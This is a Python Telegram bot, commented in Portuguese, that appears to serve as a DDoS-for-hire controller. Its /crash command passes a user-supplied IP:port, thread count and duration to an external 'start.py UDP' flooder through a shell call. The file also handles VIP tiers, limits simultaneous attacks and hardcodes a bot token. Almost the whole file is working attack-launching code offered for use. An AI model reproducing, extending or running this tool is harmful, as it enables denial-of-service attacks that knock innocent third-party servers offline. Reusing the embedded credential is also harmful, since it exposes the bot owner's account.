import telebot
import subprocess
import re
import time
from threading import Thread

BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
SEU_ID_TELEGRAM = 6430703027
bot = telebot.TeleBot(BOT_TOKEN)
processos = {}
authorized_users = [SEU_ID_TELEGRAM]  # Lista de usuários autorizados
vip_users = []  # Lista de usuários VIP
vip_commands = []  # Comandos restritos a VIPs
MAX_ATTACKS = 3  # Limite de ataques simultâneos

# Função para validar o formato de IP e Porta
def validar_ip_porta(ip_porta):
    padrao = r'^\d{1,3}(\.\d{1,3}){3}:\d+$'
    match = re.match(padrao, ip_porta)
    return match is not None

# Função para executar o comando do ataque
def executar_comando(ip_porta, threads, tempo):
    comando_terminal = f"python3 start.py UDP {ip_porta} {threads} {tempo}"
    try:
        processo = subprocess.Popen(
            comando_terminal, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
        processos[ip_porta] = processo
        time.sleep(int(tempo))  # Aguarda o tempo do ataque
        processo.terminate()  # Termina o processo após o tempo especificado
        del processos[ip_porta]  # Remove o processo da lista
    except Exception as e:
        print(f"Erro ao executar o comando: {str(e)}")

# Função para gerenciar o limite de ataques simultâneos
def manage_attacks():
    if len(processos) >= MAX_ATTACKS:
        oldest_process = list(processos.values())[0]  # Pega o primeiro processo
        oldest_process.terminate()  # Termina o processo mais antigo
        del processos[list(processos.keys())[0]]  # Remove da lista de processos

# Comando /start
@bot.message_handler(commands=['start'])
def start_message(message):
    welcome_text = (
        "Bem-vindo ao bot! 🚀\n\n"
        "Aqui estão os comandos disponíveis para você:\n\n"
        "Comandos básicos:\n"
        "/crash <IP:PORTA> <threads> <tempo> - Envia um ataque ao IP especificado.\n"
        "/meuid - Mostra seu ID de usuário.\n\n"
        "Comandos para usuários autorizados e VIPs:\n"
        "/adduser <ID> - Adiciona um usuário autorizado.\n"
        "/removeuser <ID> - Remove um usuário autorizado.\n"
        "/promovervip <ID> - Promove um usuário a VIP. (Somente o dono pode)\n"
        "/rebaixarvip <ID> - Remove o status de VIP de um usuário. (Somente o dono pode)\n\n"
        "Comandos exclusivos do dono do bot:\n"
        "/addcomandovip <comando> - Restringe um comando para VIPs.\n"
        "/revcomandovip <comando> - Remove a restrição de comando VIP.\n\n"
        "Entre em contato se precisar de ajuda! 😉"
    )
    bot.send_message(message.chat.id, welcome_text)

# Comando /crash
@bot.message_handler(commands=['crash'])
def crash_server(message):
    if '/crash' in vip_commands and message.from_user.id not in vip_users and message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "❌ Este comando é restrito a usuários VIP.")
        return

    try:
        command_parts = message.text.split()
        if len(command_parts) != 4:
            bot.send_message(message.chat.id, "Uso correto: /crash <IP:PORTA> <threads> <tempo>")
            return

        ip_port = command_parts[1]
        threads = command_parts[2]
        duration = command_parts[3]

        if not validar_ip_porta(ip_port):
            bot.send_message(message.chat.id, "Formato inválido de IP e porta. Use o formato: IP:PORTA")
            return

        manage_attacks()

        thread = Thread(target=executar_comando, args=(ip_port, threads, duration))
        thread.start()

        bot.send_message(message.chat.id, f"🚀 Ataque enviado para {ip_port} por {duration} segundos com {threads} threads!")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ocorreu um erro: {str(e)}")

# Comando /promovervip
@bot.message_handler(commands=['promovervip'])
def promover_vip(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "❌ Apenas o dono pode promover usuários a VIP.")
        return

    try:
        user_id = int(message.text.split()[1])
        if user_id not in vip_users:
            vip_users.append(user_id)
            bot.send_message(message.chat.id, f"✅ O usuário {user_id} foi promovido a VIP.")
        else:
            bot.send_message(message.chat.id, f"⚠️ O usuário {user_id} já é VIP.")
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "Uso correto: /promovervip <ID>")

# Comando /rebaixarvip
@bot.message_handler(commands=['rebaixarvip'])
def rebaixar_vip(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "❌ Apenas o dono pode remover o status de VIP.")
        return

    try:
        user_id = int(message.text.split()[1])
        if user_id in vip_users:
            vip_users.remove(user_id)
            bot.send_message(message.chat.id, f"✅ O usuário {user_id} teve o status de VIP removido.")
        else:
            bot.send_message(message.chat.id, f"⚠️ O usuário {user_id} não é VIP.")
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "Uso correto: /rebaixarvip <ID>")

# Outros comandos, como /adduser e /removeuser (mesma lógica que já mostramos antes)

# Manter o bot ativo
def keep_alive():
    while True:
        try:
            bot.polling(timeout=60)
        except Exception as e:
            print(f"Erro no bot: {e}")
            time.sleep(15)

if __name__ == "__main__":
    keep_alive()